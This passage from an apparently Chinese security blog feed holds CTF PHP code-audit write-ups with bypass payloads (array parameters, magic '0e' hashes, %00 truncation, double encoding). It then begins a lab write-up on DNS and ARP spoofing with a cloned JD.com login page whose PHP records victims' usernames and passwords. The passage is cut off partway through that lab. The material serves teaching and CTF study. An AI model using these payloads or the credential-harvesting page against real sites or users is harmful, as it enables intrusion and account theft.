<pre><code class="hljs bash"><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;
<span class="hljs-built_in">echo</span>(<span class="hljs-string">&quot;</span>
<span class="hljs-string"></span>
<span class="hljs-string">not allowed!</span>
<span class="hljs-string"></span>
<span class="hljs-string">&quot;</span>);</code></pre>



<blockquote>
<p>PHP 函数 eregi()</p>
<p>语法<br> int eregi(string pattern, string string, [array regs]);<br> 定义和用法<br> eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。</p>
<p>可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。</p>
<p>返回值<br> 如果匹配成功返回true,否则,则返回false</p>
</blockquote>
<p>这里进行了过滤，传的值不能为hackerDJ</p>
<pre><code class="hljs php">
<span class="hljs-variable">$_GET</span>[id] = urldecode(<span class="hljs-variable">$_GET</span>[id]);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>) <span class="hljs-comment">//要编码的字符串hackerDJ</span></code></pre>

<p>GET会提交时进行一次urlencode</p>
<p>urldecode()于urlencode()是一对想反作用的函数，一个解码一个编码。</p>
<p><code>$_GET[id] = urldecode($_GET[id])</code>     urldecode后的<strong>$_GET[id]</strong> 复制给自己等于hackerDJ</p>
<p>所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag</p>
<p><code>?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p>
<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])
<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) === md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))
<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>利用md5不能处理数组的特性绕过</p>
<p><a href="https://www.w3school.com.cn/php/func_string_md5.asp">md5()</a></p>
<p>md5函数遇到数组类型的参数时，返回值为null，null===null,所以满足<code>md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]</code></p>
<pre><code class="hljs dts"><span class="hljs-symbol">GET:</span>
/?username[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;password</span>[]=<span class="hljs-number">2</span></code></pre>



<h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;
<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//进行过滤，password必须包含字母和数字</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)
<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>提示是数组返回NULL</p>
<p>直接尝试提交<code>?password[]=</code>，flag就出来了</p>
<p>了解一下原理，</p>
<blockquote>
<p>代码相关知识点链接如下：</p>
<p>isset函数：<a href="http://php.net/manual/zh/function.isset.php">http://php.net/manual/zh/function.isset.php</a></p>
<p>ereg函数：<a href="http://www.php.net/manual/zh/function.ereg.php">http://www.php.net/manual/zh/function.ereg.php</a></p>
<p>strpos函数：<a href="http://www.w3school.com.cn/php/func_string_strpos.asp">http://www.w3school.com.cn/php/func_string_strpos.asp</a></p>
<p>“[A-Za-z0-9]”<br>方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符</p>
<p>“^[A-Za-z0-9]$”<br>^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串</p>
<p>“^[A-Za-z0-9]+$”<br>+号表示重复1到多次，匹配由多个数字大小字母组成的字符串</p>
</blockquote>
<p><img src="https://i.loli.net/2020/11/28/2EjrzqhlvA4pcRg.png" alt="ereg.png"></p>
<p><img src="https://i.loli.net/2020/11/28/yMSHUw8EcGd9izo.png" alt="strpos.png"></p>
<p>值得注意的是这两个函数能处理的参数都是string类型</p>
<pre><code class="hljs php">ereg只能处理字符，r如果数组，则返回的是<span class="hljs-literal">null</span>，三个等号的时候不会进行类型转换。所以<span class="hljs-literal">null</span>不等于<span class="hljs-literal">false</span>。

strpos的参数同样不能够是数组，所以返回的依旧是<span class="hljs-literal">null</span>，<span class="hljs-literal">null</span>不等于<span class="hljs-literal">false</span>也是正确。</code></pre>

<p>故?password[]=可以绕过。</p>
<p>但是还有一种为%00截断</p>
<p><code>?password=d%00--</code></p>
<h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><pre><code class="hljs php"><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
is_numeric(<span class="hljs-variable">$temp</span>)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no numeric&quot;</span>):<span class="hljs-literal">NULL</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$temp</span>&gt;<span class="hljs-number">1336</span>)&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;</code></pre>

<p>题目说了弱类型比较绕过</p>
<p>payload：</p>
<pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">1444</span>b</code></pre>

<p>首先在is_numeric()检查时，因为1444b中包含了字母b所以不会认为是数字类型</p>
<p>在判断是否大于1336时，php默认1444b是数字类型，所以大于1336</p>
<h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))
&#123;
   var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;
   var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);
   var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));
   var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]));
    
   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])
		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>;
   <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))
	    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
   <span class="hljs-keyword">else</span>
	    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;
&#125;
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>代码逻辑很简单，首先判断是否get方式传递name和password参数</p>
<p>var_dump，输出参数类型和值</p>
<p>之后如果通过if判断则可以拿到flag</p>
<p>if判断的条件</p>
<blockquote>
<p>name和password不能相同</p>
<p>但是sha1(name)===sha1(password)</p>
</blockquote>
<p>这里可以使用sha1函数无法处理数组的漏洞绕过，sha1遇到参数为数组类型时返回值为0</p>
<p>payload：</p>
<pre><code class="hljs dts"><span class="hljs-symbol">GET:</span>
?name[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;password</span>[]=<span class="hljs-number">2</span></code></pre>



<h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);
<span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;
&#125; 
<span class="hljs-keyword">else</span> &#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;
&#125;
&#125;
<span class="hljs-keyword">else</span>
&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<pre><code class="hljs stylus">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a


<span class="hljs-comment">//下面是sha1()加密后 ==相等的字符串</span>
 sha1(str)
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>)</span></span>  
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaK1STfY&#x27;</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aa3OFF9m&#x27;</span>)</span></span></code></pre>

<p>payload:</p>
<pre><code class="hljs routeros">GET:
?<span class="hljs-attribute">a</span>=240610708</code></pre>



<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span>(<span class="hljs-params"><span class="hljs-variable">$temp</span></span>)</span>
<span class="hljs-function"></span>&#123;
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;
<span class="hljs-variable">$one</span> = ord(<span class="hljs-string">&#x27;1&#x27;</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>
<span class="hljs-variable">$nine</span> = ord(<span class="hljs-string">&#x27;9&#x27;</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>
<span class="hljs-variable">$number</span> = <span class="hljs-string">&#x27;3735929054&#x27;</span>;
<span class="hljs-comment">// Check all the input characters!</span>
<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$number</span>); <span class="hljs-variable">$i</span>++)
&#123;
<span class="hljs-comment">// Disallow all the digits!</span>
<span class="hljs-variable">$digit</span> = ord(<span class="hljs-variable">$temp</span>&#123;<span class="hljs-variable">$i</span>&#125;);
<span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$digit</span> &gt;= <span class="hljs-variable">$one</span>) &amp;&amp; (<span class="hljs-variable">$digit</span> &lt;= <span class="hljs-variable">$nine</span>) )
&#123;
<span class="hljs-comment">// Aha, digit not allowed!</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;
&#125;
&#125;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span> == <span class="hljs-variable">$temp</span>)
<span class="hljs-keyword">return</span> <span class="hljs-variable">$flag</span>;
&#125;
<span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-keyword">echo</span> noother_says_correct(<span class="hljs-variable">$temp</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>重点在这段代码</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$digit</span> &gt;= <span class="hljs-variable">$one</span>) &amp;&amp; (<span class="hljs-variable">$digit</span> &lt;= <span class="hljs-variable">$nine</span>) )
&#123;
<span class="hljs-comment">// Aha, digit not allowed!</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;
&#125;
&#125;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span> == <span class="hljs-variable">$temp</span>)
<span class="hljs-keyword">return</span> <span class="hljs-variable">$flag</span>;
&#125;</code></pre>

<p>输入的数字中不能包含1-9的数字</p>
<p>如果输入的数字和相等则拿到flag</p>
<p>可以想到的是将这段数字转换为十六进制</p>
<pre><code class="hljs apache"><span class="hljs-attribute">hex</span>(<span class="hljs-number">3735929054</span>)=<span class="hljs-number">0</span>xdeadc<span class="hljs-number">0</span>de

<span class="hljs-attribute">GET</span>:
<span class="hljs-attribute">password</span>=<span class="hljs-number">0</span>xdeadc<span class="hljs-number">0</span>de</code></pre>

<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>网址打不开</p>
<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;xxx&quot;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))
&#123;
	<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)
	&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;
	&#125;
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)
	&#123;
		<span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;-&#x27;</span>) !== <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span>
		&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);
		&#125;
	<span class="hljs-keyword">else</span>
	&#123;
		<span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;- have not been found&#x27;</span>);
	&#125;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>绕过三个if语句即可拿到flag</p>
<p>第一个</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)</code></pre>

<p>这个比较常见的正则表达式，也很容易理解</p>
<p><code>[a-zA-Z0-9]+</code>包含大小写字符和数字，^是匹配开始标志，$是匹配结束标志</p>
<p>第二个</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)</code></pre>

<p>password字段长度小于8，但是大于9999999，可以使用科学计数法</p>
<p>第三个</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;-&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)</code></pre>

<p>password要包含 <code>-</code>（做题的时候会发现应该是<code>*-*</code>）</p>
<p>payload</p>
<pre><code class="hljs apache"><span class="hljs-attribute">GET</span>:
<span class="hljs-attribute">password</span>=<span class="hljs-number">1</span>e<span class="hljs-number">9</span>%<span class="hljs-number">00</span>*-*</code></pre>

<p><img src="https://i.loli.net/2020/11/28/xcjep86YFtWgXMk.png" alt="zhengze.png"></p>
<h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;
<span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">&quot;^[1-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;必须输入数字才行&#x27;</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-string">&#x27;#biubiubiu&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)
<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;骚年，继续努力吧啊~&#x27;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>直接利用ereg和strpos函数不能处理数组的特性绕过</p>
<p>当输入ctf[]=11时，ereg返回值null!==FALSE</p>
<p>strpos返回值也为null!=FALSE</p>
<p>拿到flag</p>
<p>payload：</p>
<pre><code class="hljs mel">GET:
?ctf[]=<span class="hljs-number">111</span>
<span class="hljs-comment">//正常做法</span>
?nctf=<span class="hljs-number">1</span>%00%23biubiubiu</code></pre>

<h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;POST&quot;</span> == <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>])
&#123;
<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="hljs-variable">$password</span>)) <span class="hljs-comment">//preg_match — 执行一个正则表达式匹配 长度大于12</span>
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#x27;</span>;<span class="hljs-comment">//这里输出的是假flag 真的在下面</span>
<span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-keyword">while</span> (<span class="hljs-literal">TRUE</span>)
&#123;
<span class="hljs-variable">$reg</span> = <span class="hljs-string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$arr</span>))
<span class="hljs-keyword">break</span>;
<span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;
<span class="hljs-variable">$ps</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>); 
  <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ps</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pt</span>)
&#123;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, <span class="hljs-variable">$password</span>))
<span class="hljs-variable">$c</span> += <span class="hljs-number">1</span>;
&#125;
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;
<span class="hljs-comment">//&gt;=3，必须包含四种类型三种与三种以上</span>
<span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == <span class="hljs-variable">$password</span>) <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong password&#x27;</span>;
<span class="hljs-keyword">exit</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>



<p>代码还挺长，但是直接抓住重点</p>
<pre><code class="hljs lisp">if (<span class="hljs-number">0</span> &gt;= preg_match(&#x27;/^[[<span class="hljs-symbol">:graph</span>:]]&#123;<span class="hljs-number">12</span>,&#125;$/&#x27;, $password))</code></pre>

<p>[:graph]是所有可打印的字符,{12,},是在password中匹配12次以上，即password的长度大于12</p>
<p>下面的正则</p>
<pre><code class="hljs php"><span class="hljs-variable">$ps</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>); 
  <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ps</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pt</span>)
&#123;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, <span class="hljs-variable">$password</span>))
<span class="hljs-variable">$c</span> += <span class="hljs-number">1</span>;
&#125;</code></pre>

<p>要求password中必须包含三种以上的类型的字符，于是正常构造如下的payload</p>
<pre><code class="hljs llvm">POST:
password<span class="hljs-operator">=</span><span class="hljs-number">42</span>adad<span class="hljs-comment">;d;;a</span>

//非正常的
password<span class="hljs-operator">=</span><span class="hljs-number">42</span><span class="hljs-variable">%00</span>
或者POST一个任意不等于password的字符
暂时不知道什么原因导致的</code></pre>

<p><img src="https://i.loli.net/2020/11/28/euJc6DPKCZ4a5bY.png" alt="shuzi2.png"></p>
<p><img src="https://i.loli.net/2020/11/28/HwsChaXMRFWmjeA.png" alt="shuzi1.png"></p>
<h2 id="简单waf"><a href="#简单waf" class="headerlink" title="简单waf"></a>简单waf</h2><p>网址打不开</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>变量覆盖</tag>
        <tag>函数漏洞</tag>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>diaoyu</title>
    <url>/2020/07/18/diaoyu/</url>
    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><span id="more"></span>
<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" alt><br>修改index.html中的内容<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$nam</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>
<span class="hljs-variable">$pas</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-comment">//pass也一样</span>
<span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;您已捕获京东账号及密码1个：&quot;</span> . <span class="hljs-string">&quot; 用户名 &quot;</span> . <span class="hljs-variable">$nam</span> . <span class="hljs-string">&quot; 密码 &quot;</span> . <span class="hljs-variable">$pas</span>;   <span class="hljs-comment">//保存捕获的用户名和密码</span>
<span class="hljs-variable">$filed</span> = @fopen(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);   <span class="hljs-comment">//打开1.txt</span>
@fwrite(<span class="hljs-variable">$filed</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$content</span>\n&quot;</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span>
<span class="hljs-meta">?&gt;</span>
&lt;html&gt;
&lt;head&gt;
&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;
